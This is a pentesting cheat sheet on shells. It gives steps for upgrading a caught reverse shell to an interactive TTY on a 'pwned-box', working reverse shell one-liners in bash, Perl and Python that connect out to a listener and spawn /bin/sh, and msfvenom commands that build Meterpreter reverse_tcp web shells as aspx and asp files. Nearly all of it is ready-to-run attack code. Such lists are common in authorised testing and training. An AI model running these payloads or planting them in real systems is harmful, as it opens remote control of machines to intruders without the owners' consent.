# shells

## Upgrading simple shells to interactive TTYs

```bash
pwned-box$ ^Z                     # suspend the process
host-machine$ echo $TERM          # get the terminal type
host-machine$ stty -a             # get the number of rows/cols
host-machine$ stty raw -echo      # convert terminal to raw
host-machine$ fg                  # re-open the reverse shell
pwned-box$ reset                  # reset the terminal of the reverse shell
pwned-box$ export SHELL=bash      # set the TTY settings: SHELL, TERM, and dimensions
pwned-box$ export TERM=screen
pwned-box$ stty rows <n_rows> cols <n_cols>
```

## reverse shells

### bash
- Tested using
  - Active machine: `Kali Linux 5.7.0`
  - Passive machine: `bash 5.1.4(1)-release` (Kali Linux vagrant box)
- Be sure that `bash` is in use, not `zsh`!

```
# set up netcat listener on active machine
nc -l -vvv -p (nc listener port)

# create reverse shell
# - bash -i :: start interactive bash shell
# - >&      :: redirect both stdout and stderr (fd 1 and 2)
# - /dev/tcp/ip/port :: bash specific syntax for TCP socket connection to ip:port
# - 0<&1    :: redirect fd 1 (connected to the socket) to stdin

bash -i >& /dev/tcp/(active machine)/(nc listener port) 0<&1
```

### perl (untested)

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### python (untested)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP (untested)

### ruby (untested)

### netcat 

### java

### xterm

## msfvenom

### aspx

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
```

### asp (asp.net)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

## References
- [Pentestmonkey Reverse Shell Cheatsheet](http://web.archive.org/web/20180702062128/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse shell with bash](http://web.archive.org/web/20180625050916/http://www.gnucitizen.org/blog/reverse-shell-with-bash/)
- [The TTY demystified](http://www.linusakesson.net/programming/tty/)
- [Upgrading simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [msfvenom cheatsheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
